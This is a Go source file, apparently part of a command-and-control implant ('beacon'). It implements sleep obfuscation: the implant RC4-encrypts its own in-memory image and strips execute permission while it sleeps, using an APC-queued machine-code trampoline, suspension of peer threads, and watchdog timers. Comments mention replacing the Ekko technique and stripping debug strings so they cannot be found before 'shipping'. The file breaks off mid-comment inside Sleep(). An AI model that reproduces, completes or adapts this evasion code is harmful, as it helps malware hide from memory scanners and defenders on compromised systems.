// Package apc implements sleep obfuscation via a QueueUserAPC-driven
// encrypt/sleep/decrypt sequence running on the beacon's own thread,
// with a minimal peer-thread suspension pass around it to prevent Go
// runtime threads from faulting on the encrypted image.
//
// Design summary
//
// This replaces the older Ekko-based sleep obfuscation, which was
// fundamentally incompatible with Go's runtime. See the claude_ekko
// branch and the postmortem in that commit history for the details.
//
// The core encrypt-sleep-decrypt cycle runs from a hand-written amd64
// trampoline placed in a VirtualAlloc'd RWX region OUTSIDE the process
// image. Because the trampoline sits in a separate allocation and only
// calls into ntdll/kernel32/advapi32 (never back into the encrypted Go
// .text), it runs cleanly through the encrypted window on the same
// thread that queued it as an APC.
//
// BUT: with the image un-executable, any OTHER Go M (sysmon,
// netpoller, GC worker, timer callback) that happens to fetch an
// instruction from .text during the encrypted window will AV and take
// the process down. That is the crash we saw on the first attempt at
// this design without any peer-thread management.
//
// Fix: before entering the alertable wait, snapshot threads and
// SuspendThread every image-based peer, then briefly delay to let the
// kernel commit the suspensions before the trampoline touches memory.
// After the wait returns, ResumeThread each peer (draining any
// accumulated suspend count from Go's own async-preemption).
//
// We deliberately do NOT do the things that made Ekko fragile:
//   - No CreateTimerQueue / NtContinue ROP hijack — everything runs
//     as a single APC on our own thread.
//   - No GetThreadContext after SuspendThread — that call has no
//     timeout and hung whenever a target was suspended mid-kernel-
//     transition. We replace it with a fixed short NtDelayExecution.
//   - No repeated Ekko-style syscall churn per peer — just one
//     SuspendThread and one ResumeThread(-drain) each, per cycle.
//
// See the claude_ekko postmortem for why each of the above matters.
package apc

import (
	"crypto/rand"
	"errors"
	"fmt"
	"runtime"
	"sync/atomic"
	"syscall"
	"time"
	"unsafe"

	"golang.org/x/sys/windows"
)

const (
	pageReadWrite        uintptr = 0x04
	pageExecuteReadWrite uintptr = 0x40

	memCommit  uintptr = 0x1000
	memReserve uintptr = 0x2000
	memRelease uintptr = 0x8000

	// NtQueryInformationThread information class for the thread's
	// user-mode start address (used to filter peer threads to only those
	// that started inside our image — i.e. Go runtime Ms, not thread-pool
	// workers or third-party threads).
	threadQuerySetWin32StartAddress uintptr = 0x9

	// NtQueryInformationThread information class returning the current
	// kernel suspend count as a ULONG. Undocumented-but-stable; present
	// since Windows 10 1607. Lets us READ the suspend count without
	// perturbing it (no Suspend/Resume race introduced by the check).
	// Buffer size = 4 bytes.
	threadSuspendCount uintptr = 0x23

	// Milliseconds to sleep between the suspend pass and the APC.
	// SuspendThread is asynchronous; the kernel needs a moment to commit
	// each suspension. GetThreadContext would block until commit but has
	// no timeout — we use a fixed short delay instead.
	commitDelayMs int64 = 5

	// ResumeThread drain cap. Bumped from 32 to 1024 after we observed a
	// hang whose signature was "peer Ms permanently OS-suspended with
	// near-zero CPU time." One hypothesis is that Go's sysmon and any
	// other concurrent-suspend source (a security product, kernel worker,
	// etc.) can race harder with our own SuspendThread than 32 iterations
	// covers. 1024 is well below MAXIMUM_SUSPEND_COUNT (0x7F) times any
	// realistic race count and still a bounded runaway backstop.
	maxResumeDrain = 1024

	// apcDebug gates OutputDebugStringA probes throughout this package.
	// Set to false and rebuild before shipping — the probe format strings
	// live in .rdata and are trivially discoverable with `strings`.
	apcDebug = true

	// Watchdog: per-peer one-shot Windows thread-pool timers. Each timer's
	// callback is procResumeThread.Addr() DIRECTLY — no Go callback, no
	// LazyProc.Call, no cgocallback path. If Sleep deadlocks in the
	// P-handoff race (see ANALYSIS.md), each timer independently fires
	// ResumeThread on its assigned peer, breaking the deadlock without
	// requiring any Go-mediated syscall to succeed.
	//
	// The previous implementation used a single Go-callback timer that
	// ran a Toolhelp+enumerate loop. It never worked because the callback
	// itself needs a P to acquire from Go's runtime (via cgocallback →
	// needm → acquirep), and when every Go M is suspended there are no
	// Ps to hand out. The direct-API design bypasses all of that.
	//
	// Margin is proportional to sleep interval, floored/capped so short
	// beacons recover quickly and long beacons don't waste time on a
	// margin that will never trigger anyway.
	watchdogMarginMinMs = 5000
	watchdogMarginMaxMs = 15000

	// Timeout for the resume-phase watchdogs. Fixed at 8 seconds — the
	// resume loop should normally complete in milliseconds, so any real
	// deadlock in the resume path is caught quickly. Not proportional
	// to sleepMs because the resume phase's duration has nothing to do
	// with the caller's sleep interval.
	resumeWatchdogMs = 8000

	// WT_EXECUTEONLYONCE: this timer fires exactly once and self-deletes.
	// From Windows headers.
	wtExecuteOnlyOnce = 0x00000008

	// DWORD (uint32) representation of -1, cast to uintptr. SuspendThread
	// and ResumeThread return DWORD; on failure they return (DWORD)-1
	// which zero-extends to 0x00000000FFFFFFFF in a 64-bit register, NOT
	// 0xFFFFFFFFFFFFFFFF.
	dwordMinusOne uintptr = 0xFFFFFFFF
)

var (
	kernel32             = syscall.NewLazyDLL("kernel32.dll")
	procGetModuleHandleA = kernel32.NewProc("GetModuleHandleA")
	procVirtualAlloc     = kernel32.NewProc("VirtualAlloc")
	procVirtualFree      = kernel32.NewProc("VirtualFree")
	procVirtualProtect   = kernel32.NewProc("VirtualProtect")
	procQueueUserAPC     = kernel32.NewProc("QueueUserAPC")
	procSuspendThread    = kernel32.NewProc("SuspendThread")
	procResumeThread     = kernel32.NewProc("ResumeThread")
	procOutputDebugStringA = kernel32.NewProc("OutputDebugStringA")

	procCreateTimerQueueTimer = kernel32.NewProc("CreateTimerQueueTimer")
	procDeleteTimerQueueTimer = kernel32.NewProc("DeleteTimerQueueTimer")

	ntdll                        = syscall.NewLazyDLL("ntdll.dll")
	procNtDelayExecution         = ntdll.NewProc("NtDelayExecution")
	procNtWaitForSingleObject  = ntdll.NewProc("NtWaitForSingleObject")
	procNtQueryInformationThread = ntdll.NewProc("NtQueryInformationThread")

	advapi32              = syscall.NewLazyDLL("Advapi32.dll")
	procSystemFunction032 = advapi32.NewProc("SystemFunction032")
)

// Cumulative counters. Exposed via Stats(). No behavior changes based on them.
var (
	cyclesTotal atomic.Uint64
	errorsTotal atomic.Uint64
)

// Stats returns (cycles, errors) counters since process start. Useful for
// beacon telemetry to detect a host on which APC-based sleep is failing.
func Stats() (cycles, errors uint64) {
	return cyclesTotal.Load(), errorsTotal.Load()
}

// dbg emits a line to any attached debugger (DbgView with global capture,
// WinDbg, etc.) via OutputDebugStringA. Silently dropped by the kernel
// when no debugger is present, so cheap in normal operation — but the
// format strings live in .rdata, so gate at compile time (apcDebug=false)
// before shipping.
func dbg(format string, args ...any) {
	if !apcDebug {
		return
	}
	msg := fmt.Sprintf("[apc] "+format+"\n", args...)
	p, err := windows.BytePtrFromString(msg)
	if err != nil {
		return
	}
	procOutputDebugStringA.Call(uintptr(unsafe.Pointer(p)))
	runtime.KeepAlive(p)
}

// ustring matches the informal SystemFunction032 argument type
// (ULONG Length, ULONG MaximumLength, PVOID Buffer). It is used as the
// data-and-key descriptor for the in-place RC4 encryption.
type ustring struct {
	Length        uint32
	MaximumLength uint32
	Buffer        uintptr
}

// imageNTHeaders64Prefix is enough of IMAGE_NT_HEADERS64 to read SizeOfImage.
// Field order is exactly the PE spec; alignment matches natural layout.
type imageNTHeaders64Prefix struct {
	Signature uint32
	// IMAGE_FILE_HEADER (20 bytes)
	Machine              uint16
	NumberOfSections     uint16
	TimeDateStamp        uint32
	PointerToSymbolTable uint32
	NumberOfSymbols      uint32
	SizeOfOptionalHeader uint16
	Characteristics      uint16
	// IMAGE_OPTIONAL_HEADER64 (partial)
	Magic                       uint16
	MajorLinkerVersion          uint8
	MinorLinkerVersion          uint8
	SizeOfCode                  uint32
	SizeOfInitializedData       uint32
	SizeOfUninitializedData     uint32
	AddressOfEntryPoint         uint32
	BaseOfCode                  uint32
	ImageBase                   uint64
	SectionAlignment            uint32
	FileAlignment               uint32
	MajorOperatingSystemVersion uint16
	MinorOperatingSystemVersion uint16
	MajorImageVersion           uint16
	MinorImageVersion           uint16
	MajorSubsystemVersion       uint16
	MinorSubsystemVersion       uint16
	Win32VersionValue           uint32
	SizeOfImage                 uint32
}

// apcArgs is the struct passed to the trampoline via QueueUserAPC's dwData.
//
// FIELD OFFSETS ARE HARD-CODED IN THE TRAMPOLINE MACHINE CODE. Do not
// reorder, resize, or insert fields without also updating the trampoline
// AND the init-time offset assertion below. A mismatch would produce a
// silent crash inside the encrypted window (unrecoverable).
type apcArgs struct {
	imageBase        uintptr // 0x00
	imageSize        uintptr // 0x08
	oldProt          uint32  // 0x10  (VirtualProtect out-param)
	_pad             uint32  // 0x14  (alignment to 8 for the ustring below)
	img              ustring // 0x18  (16 bytes)
	key              ustring // 0x28  (16 bytes)
	delayInterval    int64   // 0x38  (100-ns units, negative = relative)
	virtualProtect   uintptr // 0x40
	systemFunc032    uintptr // 0x48
	ntDelayExecution uintptr // 0x50
}

// trampoline is hand-written amd64 machine code invoked as a
// QueueUserAPC callback. On entry, RCX points to an apcArgs struct.
//
// Sequence (each call preserves RBX per Windows x64 ABI):
//
//	VirtualProtect(base, size, PAGE_READWRITE,          &oldProt)
//	SystemFunction032(&img, &key)                          // RC4 encrypt
//	NtDelayExecution(FALSE, &delayInterval)                // sleep
//	SystemFunction032(&img, &key)                          // RC4 decrypt (symmetric)
//	VirtualProtect(base, size, PAGE_EXECUTE_READWRITE,  &oldProt)
//	ret
//
// Byte-for-byte annotated:
var trampoline = []byte{
	// Prologue: save RBX, reserve 48 bytes (32 shadow + 16 spare).
	// Entry Rsp % 16 == 8 (call pushed 8-byte ret addr); after push rbx
	// it becomes 0; after sub rsp, 0x30 it stays 0 — properly aligned
	// for the calls that follow.
	0x53,                   // push rbx
	0x48, 0x83, 0xEC, 0x30, // sub rsp, 0x30
	0x48, 0x89, 0xCB,       // mov rbx, rcx           ; rbx = args ptr

	// VirtualProtect(base, size, PAGE_READWRITE, &oldProt)
	0x48, 0x8B, 0x4B, 0x00,             // mov rcx, [rbx+0x00]
	0x48, 0x8B, 0x53, 0x08,             // mov rdx, [rbx+0x08]
	0x41, 0xB8, 0x04, 0x00, 0x00, 0x00, // mov r8d, 0x04
	0x4C, 0x8D, 0x4B, 0x10,             // lea r9,  [rbx+0x10]
	0xFF, 0x53, 0x40,                   // call qword ptr [rbx+0x40]

	// SystemFunction032(&img, &key) -- encrypt
	0x48, 0x8D, 0x4B, 0x18, // lea rcx, [rbx+0x18]
	0x48, 0x8D, 0x53, 0x28, // lea rdx, [rbx+0x28]
	0xFF, 0x53, 0x48,       // call qword ptr [rbx+0x48]

	// NtDelayExecution(FALSE, &delayInterval)
	// Non-alertable: no other APCs can slip in between encrypt and decrypt.
	0x33, 0xC9,             // xor ecx, ecx
	0x48, 0x8D, 0x53, 0x38, // lea rdx, [rbx+0x38]
	0xFF, 0x53, 0x50,       // call qword ptr [rbx+0x50]

	// SystemFunction032(&img, &key) -- decrypt (RC4 is symmetric)
	0x48, 0x8D, 0x4B, 0x18, // lea rcx, [rbx+0x18]
	0x48, 0x8D, 0x53, 0x28, // lea rdx, [rbx+0x28]
	0xFF, 0x53, 0x48,       // call qword ptr [rbx+0x48]

	// VirtualProtect(base, size, PAGE_EXECUTE_READWRITE, &oldProt)
	0x48, 0x8B, 0x4B, 0x00,             // mov rcx, [rbx+0x00]
	0x48, 0x8B, 0x53, 0x08,             // mov rdx, [rbx+0x08]
	0x41, 0xB8, 0x40, 0x00, 0x00, 0x00, // mov r8d, 0x40
	0x4C, 0x8D, 0x4B, 0x10,             // lea r9,  [rbx+0x10]
	0xFF, 0x53, 0x40,                   // call qword ptr [rbx+0x40]

	// Epilogue
	0x48, 0x83, 0xC4, 0x30, // add rsp, 0x30
	0x5B,                   // pop rbx
	0xC3,                   // ret
}

func init() {
	// Resolve every Windows procedure we call at startup so a bad symbol
	// name fails loudly here instead of panicking on the first Sleep().
	// Learned the hard way — an "NtWaitForSingleObjectEx" typo (that
	// function does not exist in ntdll; the Ex suffix is Win32-only)
	// produced a silent 2-second crash on the first sleep cycle.
	for _, p := range []*syscall.LazyProc{
		procGetModuleHandleA, procVirtualAlloc, procVirtualFree,
		procVirtualProtect, procQueueUserAPC, procSuspendThread, procResumeThread,
		procOutputDebugStringA,
		procCreateTimerQueueTimer, procDeleteTimerQueueTimer,
		procNtDelayExecution, procNtWaitForSingleObject, procNtQueryInformationThread,
		procSystemFunction032,
	} {
		if err := p.Find(); err != nil {
			panic(fmt.Sprintf("apc: cannot resolve %s: %v", p.Name, err))
		}
	}

	// (The watchdog no longer uses a Go callback. See the design notes
	// near CreateTimerQueueTimer usage in Sleep().)

	// The trampoline references apcArgs fields by hard-coded byte offset.
	// Fail loudly at startup if Go's struct layout has drifted from what
	// the machine code expects — a mismatch here would produce a silent
	// crash inside the encrypted window at first Sleep() call.
	var a apcArgs
	mustOffset("imageBase",        unsafe.Offsetof(a.imageBase),        0x00)
	mustOffset("imageSize",        unsafe.Offsetof(a.imageSize),        0x08)
	mustOffset("oldProt",          unsafe.Offsetof(a.oldProt),          0x10)
	mustOffset("img",              unsafe.Offsetof(a.img),              0x18)
	mustOffset("key",              unsafe.Offsetof(a.key),              0x28)
	mustOffset("delayInterval",    unsafe.Offsetof(a.delayInterval),    0x38)
	mustOffset("virtualProtect",   unsafe.Offsetof(a.virtualProtect),   0x40)
	mustOffset("systemFunc032",    unsafe.Offsetof(a.systemFunc032),    0x48)
	mustOffset("ntDelayExecution", unsafe.Offsetof(a.ntDelayExecution), 0x50)
}

func mustOffset(name string, got, want uintptr) {
	if got != want {
		panic(fmt.Sprintf("apc: apcArgs.%s at offset 0x%X, expected 0x%X (trampoline drift)", name, got, want))
	}
}

// healResidualSuspends is a self-healing sweep that runs at the very top
// of every Sleep cycle. It enumerates image-based peer threads and, for
// each one, READS the current kernel suspend count via
// NtQueryInformationThread(ThreadSuspendCount) — a query that does NOT
// mutate the count. If any thread has residual suspensions from prior
// cycles (leaked by whatever race is at play in the Go-runtime /
// Windows sysmon / our SuspendThread interaction), we drain them to
// zero here before doing anything else.
//
// The critical property: this uses a QUERY, not a Suspend+Resume probe,
// so it introduces no new race with sysmon's async preemption. It is
// purely additive to the existing flow.
//
// Overhead in the steady state (no residue found): one Toolhelp
// snapshot, one OpenThread + one NtQueryInformationThread + one
// CloseHandle per peer. On a typical Go beacon this is 5-6 syscalls
// per cycle — unmeasurable in practice.
func healResidualSuspends(currentTID uint32, imageBase, imageEnd uintptr) {
	hSnapshot, err := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPTHREAD, 0)
	if err != nil {
		return
	}
	defer windows.CloseHandle(hSnapshot)

	var te windows.ThreadEntry32
	te.Size = uint32(unsafe.Sizeof(te))
	if err := windows.Thread32First(hSnapshot, &te); err != nil {
		return
	}

	currentPID := uint32(windows.GetCurrentProcessId())
	healed := 0
	scanned := 0

	for {
		if te.OwnerProcessID == currentPID && te.ThreadID != currentTID {
			hThread, openErr := windows.OpenThread(
				windows.THREAD_SUSPEND_RESUME|windows.THREAD_QUERY_INFORMATION,
				false, te.ThreadID,
			)
			if openErr == nil {
				// Filter to image-based threads (same rule as suspend pass).
				var startAddr, retLen uintptr
				procNtQueryInformationThread.Call(
					uintptr(hThread),
					threadQuerySetWin32StartAddress,
					uintptr(unsafe.Pointer(&startAddr)),
					unsafe.Sizeof(startAddr),
					uintptr(unsafe.Pointer(&retLen)),
				)
				if startAddr >= imageBase && startAddr < imageEnd {
					scanned++

					// READ the suspend count. This does NOT change it.
					var suspCount uint32
					var qRetLen uintptr
					status, _, _ := procNtQueryInformationThread.Call(
						uintptr(hThread),
						threadSuspendCount,
						uintptr(unsafe.Pointer(&suspCount)),
						unsafe.Sizeof(suspCount),
						uintptr(unsafe.Pointer(&qRetLen)),
					)

					if status == 0 && suspCount > 0 {
						// Residual suspension detected. Drain it.
						drainCalls := 0
						var lastR uintptr
						for i := uint32(0); i < uint32(maxResumeDrain); i++ {
							r, _, _ := procResumeThread.Call(uintptr(hThread))
							drainCalls++
							lastR = r
							if r == 0 || r == 1 || r == dwordMinusOne {
								break
							}
						}
						healed++
						dbg("heal tid=%d preSuspCount=%d drainCalls=%d lastR=%d",
							te.ThreadID, suspCount, drainCalls, lastR)
					}
				}
				windows.CloseHandle(hThread)
			}
		}

		if err := windows.Thread32Next(hSnapshot, &te); err != nil {
			break
		}
	}

	if healed > 0 {
		dbg("heal summary scanned=%d healed=%d", scanned, healed)
	}
}

// peerState is one suspended image-based peer thread plus its per-peer
// watchdog timer. The handle stays open for the duration of the Sleep
// cycle (needed by both the watchdog callback and our own resume pass)
// and is closed at cleanup time.
type peerState struct {
	tid     uint32
	hThread windows.Handle
	hTimer  uintptr
}

// suspendAndArmPeers combines what used to be `suspendImagePeers` +
// the separate watchdog-arming loop into a single pass.
//
// CRUCIALLY, the per-peer watchdog timer is armed BEFORE that peer's
// SuspendThread. This closes the deadlock window we hit in resc_att2:
// the P-handoff race is triggered by our own SuspendThread on the M
// that grabbed our released P, and the deadlock manifests in the
// exitsyscall of the VERY suspend call that trapped it (or a
// subsequent syscall in the same loop). If we arm the watchdog after
// the fact, we never get there — no rescue happens. Arming inline
// means every SuspendThread has its rescue timer already ticking.
//
// The timer's callback is procResumeThread.Addr() — a raw Windows API
// pointer, NOT a Go callback. See ANALYSIS.md for why the Go-callback
// design would deadlock in the same way as the caller.
//
// We DO NOT call GetThreadContext after SuspendThread — that syscall
// blocks until the kernel commits the suspension and has no timeout,
// which was the source of one of the Ekko-era hangs.
func suspendAndArmPeers(
	currentTID uint32,
	imageBase, imageEnd uintptr,
	wdTimeoutMs uint64,
) ([]peerState, error) {
	hSnapshot, err := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPTHREAD, 0)
	if err != nil {
		return nil, err
	}
	defer windows.CloseHandle(hSnapshot)

	var te windows.ThreadEntry32
	te.Size = uint32(unsafe.Sizeof(te))
	if err := windows.Thread32First(hSnapshot, &te); err != nil {
		return nil, err
	}

	currentPID := uint32(windows.GetCurrentProcessId())
	peers := make([]peerState, 0, 32)

	for {
		if te.OwnerProcessID == currentPID && te.ThreadID != currentTID {
			hThread, openErr := windows.OpenThread(
				windows.THREAD_SUSPEND_RESUME|windows.THREAD_QUERY_INFORMATION,
				false, te.ThreadID,
			)
			if openErr == nil {
				var startAddr, retLen uintptr
				procNtQueryInformationThread.Call(
					uintptr(hThread),
					threadQuerySetWin32StartAddress,
					uintptr(unsafe.Pointer(&startAddr)),
					unsafe.Sizeof(startAddr),
					uintptr(unsafe.Pointer(&retLen)),
				)
				if startAddr >= imageBase && startAddr < imageEnd {
					// Arm the watchdog BEFORE the SuspendThread that
					// might deadlock us. If Suspend blocks in
					// exitsyscall, this timer will still fire and
					// ResumeThread us out of it.
					var hTimer uintptr
					wdRet, _, _ := procCreateTimerQueueTimer.Call(
						uintptr(unsafe.Pointer(&hTimer)),
						0, // NULL queue = default process-wide queue
						procResumeThread.Addr(),
						uintptr(hThread),
						uintptr(wdTimeoutMs),
						0, // Period = 0
						wtExecuteOnlyOnce,
					)
					r, _, _ := procSuspendThread.Call(uintptr(hThread))
					if r != dwordMinusOne {
						peers = append(peers, peerState{
							tid:     te.ThreadID,
							hThread: hThread,
							hTimer:  hTimer,
						})
						// Handle stays open; ownership transferred to
						// peers slice. Timer may be 0 if arming failed
						// (rare) — treated as "no rescue for this
						// peer" but suspend still tracked.
					} else {
						// Suspend failed. Cancel any timer we armed
						// and close the handle we opened.
						if wdRet != 0 {
							procDeleteTimerQueueTimer.Call(0, hTimer, ^uintptr(0))
						}
						windows.CloseHandle(hThread)
					}
				} else {
					// Not image-based; not our concern.
					windows.CloseHandle(hThread)
				}
			}
		}
		if err := windows.Thread32Next(hSnapshot, &te); err != nil {
			break
		}
	}
	return peers, nil
}

// resumePeers iterates the TID list produced by suspendImagePeers and
// resumes each one, DRAINING the suspend count with a bounded loop.
// Go's sysmon can independently suspend the same M as part of async
// preemption; if it does so while our own SuspendThread is in effect,
// the counter can exceed 1 and a single ResumeThread call would leave
// the thread stuck. Draining until ResumeThread returns 1 (was last
// suspension) or 0 (wasn't suspended) fixes that.
//
// The `cycle` argument is only used for debug probes; passing 0 is fine
// when the caller doesn't have a cycle number to report.
//
// DIAGNOSTIC MODE: this build logs every case that isn't "single Resume
// call returned 1" — including openThread failures, ResumeThread
// returning -1 (error), and any drain that took more than one iteration.
// Previous silent-break logic was hiding the actual failure mode: on the
// last run, four peer Ms (including Go's netpoller) ended up permanently
// suspended with no drain messages, which is only possible if
// ResumeThread was returning -1 on the very first call and the drain
// loop broke without logging.
// cancelWatchdogs cancels every peer's watchdog timer. INVALID_HANDLE_VALUE
// as CompletionEvent tells DeleteTimerQueueTimer to wait for any in-flight
// callback — so when this returns, the state of each peer's suspend count
// is stable (either the watchdog already fired and drained a suspend, or
// it was cancelled before it could).
//
// Called AFTER the suspend loop returns but BEFORE we do anything else
// with the peer state (e.g. verifying that all peers are still suspended).
// Splitting cancel from resume+close makes the abort decision unambiguous:
// once cancelWatchdogs returns, no timer can fire and un-suspend a peer
// behind our back.
func cancelWatchdogs(peers []peerState) {
	for i := range peers {
		if peers[i].hTimer != 0 {
			procDeleteTimerQueueTimer.Call(0, peers[i].hTimer, ^uintptr(0))
			peers[i].hTimer = 0
		}
	}
}

// verifyAllPeersSuspended queries the kernel suspend count for each
// peer. Returns (all-suspended, first-unsuspended-tid). If any peer has
// a count of 0, its watchdog fired during the suspend loop (or Suspend
// silently failed) — that peer is running and would crash if we
// entered the encrypted window with `.text` non-executable.
//
// Called AFTER cancelWatchdogs, so counts don't change while we check.
func verifyAllPeersSuspended(peers []peerState) (bool, uint32) {
	for _, p := range peers {
		var count uint32
		var retLen uintptr
		status, _, _ := procNtQueryInformationThread.Call(
			uintptr(p.hThread),
			threadSuspendCount,
			uintptr(unsafe.Pointer(&count)),
			unsafe.Sizeof(count),
			uintptr(unsafe.Pointer(&retLen)),
		)
		if status != 0 || count == 0 {
			return false, p.tid
		}
	}
	return true, 0
}

// armResumeWatchdogs installs a per-peer one-shot Windows timer that
// fires resumeWatchdogMs later, invoking ResumeThread on that peer's
// handle. Symmetric with the arming that happens inline in
// suspendAndArmPeers, but for the resume phase.
//
// Why the resume phase needs its own watchdogs: our resume loop makes
// one LazyProc.Call per peer, and each Call's entersyscall/exitsyscall
// participates in the same P-handoff race the suspend loop does. If a
// just-resumed peer starts running and holds a P (particularly if
// sysmon is still suspended and can't do handoff), a later resume in
// the loop can deadlock in exitsyscall. The resume-phase watchdogs are
// the safety net for that path — if any suspended peer's timer fires,
// its ResumeThread wakes that peer, and whoever unblocks first
// eventually releases a P for our stuck M.
//
// Timers are attached to peers[i].hTimer (which was zeroed by
// cancelWatchdogs earlier). resumeAndClose will then cancel each
// timer as part of its per-peer cleanup loop, so no separate cleanup
// step is needed.
func armResumeWatchdogs(peers []peerState) {
	for i := range peers {
		var hTimer uintptr
		procCreateTimerQueueTimer.Call(
			uintptr(unsafe.Pointer(&hTimer)),
			0, // NULL queue = default process-wide queue
			procResumeThread.Addr(),
			uintptr(peers[i].hThread),
			uintptr(resumeWatchdogMs),
			0, // Period = 0
			wtExecuteOnlyOnce,
		)
		peers[i].hTimer = hTimer
	}
}

// resumeAndClose is the tail cleanup. Cancels each peer's watchdog
// timer (if set), drain-resumes the peer, and closes the handle.
// Both the normal encryption path and the safe-abort path call this.
//
// When called after armResumeWatchdogs, the timer cancellation blocks
// (INVALID_HANDLE_VALUE) until any in-flight watchdog callback
// completes — so if a timer fired mid-loop and its ResumeThread on
// this peer is still running, we wait for it before proceeding to
// CloseHandle. That closes the use-after-free window between callback
// and close.
func resumeAndClose(cycle uint64, peers []peerState) {
	tids := make([]uint32, 0, len(peers))
	for _, p := range peers {
		tids = append(tids, p.tid)
	}
	dbg("cycle=%d resume begin tids=%v", cycle, tids)

	failures := 0
	for _, p := range peers {
		// Watchdog timers should already be cancelled by cancelWatchdogs
		// before this runs. But guard: if hTimer is still set (e.g. an
		// error path forgot to call cancelWatchdogs), cancel here.
		if p.hTimer != 0 {
			procDeleteTimerQueueTimer.Call(0, p.hTimer, ^uintptr(0))
		}

		// Drain the suspend count. Same logic as before; the handle is
		// already open on the peerState.
		var lastR uintptr
		var lastErr error
		drainCalls := 0
		for i := 0; i < maxResumeDrain; i++ {
			r, _, callErr := procResumeThread.Call(uintptr(p.hThread))
			drainCalls++
			lastR = r
			lastErr = callErr
			if r == 0 {
				break // Was not suspended (watchdog may have gotten here first).
			}
			if r == 1 {
				break // Was suspended once; now zero.
			}
			if r == dwordMinusOne {
				failures++
				dbg("cycle=%d tid=%d RESUME_FAIL r=-1 err=%v drainCalls=%d",
					cycle, p.tid, callErr, drainCalls)
				break
			}
			// r > 1: still suspended, keep draining.
		}

		if drainCalls >= 2 {
			tag := ""
			if drainCalls == maxResumeDrain && lastR > 1 && lastR != dwordMinusOne {
				tag = " CAP_HIT_STILL_SUSPENDED"
				failures++
			}
			dbg("cycle=%d tid=%d DRAIN calls=%d lastR=%d lastErr=%v%s",
				cycle, p.tid, drainCalls, lastR, lastErr, tag)
		}

		windows.CloseHandle(p.hThread)
	}

	if failures > 0 {
		dbg("cycle=%d resume end failures=%d (peers may still be suspended)", cycle, failures)
	}
}

// watchdogTimeoutMs returns the deadline (in ms) after which the
// per-peer watchdog timers should fire. Proportional to sleepMs, so
// short-interval beacons recover quickly while long-interval beacons
// don't wait 5x their sleep before rescuing.
func watchdogTimeoutMs(sleepMs uint64) uint64 {
	margin := sleepMs
	if margin < watchdogMarginMinMs {
		margin = watchdogMarginMinMs
	} else if margin > watchdogMarginMaxMs {
		margin = watchdogMarginMaxMs
	}
	total := sleepMs + margin
	if total > 0x7FFFFFFF {
		total = 0x7FFFFFFF // CreateTimerQueueTimer's DueTime is DWORD
	}
	return total
}

// Sleep obfuscates the current process image for sleepMs milliseconds.
//
// See the package-level comment for the overall design. The important
// invariants for correctness are:
//
//   - runtime.LockOSThread pins the beacon goroutine to this M for the
//     entire duration, so the APC we queue is guaranteed to land on the
//     same thread that enters the alertable wait.
//   - The trampoline lives in a fresh VirtualAlloc'd RWX region that is
//     NOT part of the process image, so it survives the encryption pass.
//   - The trampoline never calls back into Go .text; every function it
//     invokes lives in ntdll / kernel32 / advapi32.
//   - The apcArgs struct is heap-allocated (escape analysis lifts it out
//     of the goroutine stack because we pass its address to unmanaged
//     code) so the trampoline can dereference it after we return control
//     to the alertable wait.
func Sleep(sleepMs uint64) error {
	if sleepMs == 0 {
		return nil
	}
	cycle := cyclesTotal.Add(1)
	sleepStart := time.Now()
	dbg("cycle=%d enter Sleep sleepMs=%d cyclesTotal=%d errors=%d",
		cycle, sleepMs, cycle, errorsTotal.Load())

	runtime.LockOSThread()
	defer runtime.UnlockOSThread()

	// Image base and size — needed to know what to encrypt.
	imageBase, _, _ := procGetModuleHandleA.Call(0)
	if imageBase == 0 {
		errorsTotal.Add(1)
		return errors.New("apc: GetModuleHandleA returned NULL")
	}
	eLfaNew := *((*uint32)(unsafe.Pointer(imageBase + 0x3c)))
	nt := (*imageNTHeaders64Prefix)(unsafe.Pointer(imageBase + uintptr(eLfaNew)))
	imageSize := uintptr(nt.SizeOfImage)

	// Fresh RC4 key per cycle.
	var keyBuf [16]byte
	if _, err := rand.Read(keyBuf[:]); err != nil {
		errorsTotal.Add(1)
		return err
	}

	// Allocate the trampoline OUTSIDE the image mapping so that when the
	// image is encrypted the trampoline's own code is unaffected.
	tramp, _, _ := procVirtualAlloc.Call(
		0,
		uintptr(len(trampoline)),
		memCommit|memReserve,
		pageExecuteReadWrite,
	)
	if tramp == 0 {
		errorsTotal.Add(1)
		return errors.New("apc: VirtualAlloc for trampoline failed")
	}
	defer procVirtualFree.Call(tramp, 0, memRelease)

	copy(
		unsafe.Slice((*byte)(unsafe.Pointer(tramp)), len(trampoline)),
		trampoline,
	)

	// Heap-allocated args — pointer given to unmanaged code, so escape
	// analysis promotes it to the heap and stack moves cannot invalidate
	// the pointer while the APC is in flight.
	args := &apcArgs{
		imageBase: imageBase,
		imageSize: imageSize,
		img: ustring{
			Length:        uint32(imageSize),
			MaximumLength: uint32(imageSize),
			Buffer:        imageBase,
		},
		key: ustring{
			Length:        uint32(len(keyBuf)),
			MaximumLength: uint32(len(keyBuf)),
			Buffer:        uintptr(unsafe.Pointer(&keyBuf[0])),
		},
		// 100-ns units, negative sign = relative delay.
		delayInterval:    -int64(sleepMs) * 10_000,
		virtualProtect:   procVirtualProtect.Addr(),
		systemFunc032:    procSystemFunction032.Addr(),
		ntDelayExecution: procNtDelayExecution.Addr(),
	}

	// Real handle to self. The pseudo-handle from GetCurrentThread works
	// with QueueUserAPC in practice but is not documented as guaranteed;
	// take the safe path.
	currentTID := windows.GetCurrentThreadId()
	hSelf, err := windows.OpenThread(
		windows.THREAD_SET_CONTEXT|windows.THREAD_QUERY_INFORMATION,
		false,
		currentTID,
	)
	if err != nil {
		errorsTotal.Add(1)
		return err
	}
	defer windows.CloseHandle(hSelf)

	// -------- SUSPEND PEER GO Ms --------
	// The trampoline is about to strip the image's execute bit and encrypt
	// it. Any other thread that fetches an instruction from .text during
	// that window (Go's sysmon fires every ~20 ms; netpoller and GC
	// workers wake on demand) would AV and take the whole process down.
	// Freeze them for the duration of the cycle. All Go heap allocations
	// above this line have already run; below it we only make Windows
	// syscalls, so a suspended peer can't be holding a Go runtime lock
	// that we then wait on.
	imageEnd := imageBase + imageSize

	// Self-heal any residual suspensions from prior cycles before we do
	// anything else. See healResidualSuspends() docs for the theory of
	// operation. This step does NOT itself suspend any peer, so no
	// P-handoff deadlock can occur here — safe to run before the
	// watchdog is armed.
	healResidualSuspends(currentTID, imageBase, imageEnd)

	// Suspend peers AND arm their per-peer watchdog timers in a single
	// interleaved pass. Each peer's watchdog is created BEFORE that
	// peer's SuspendThread, so the very first suspend call is already
	// covered by a rescue timer. Without this ordering, the P-handoff
	// deadlock during the suspend loop itself would go un-rescued —
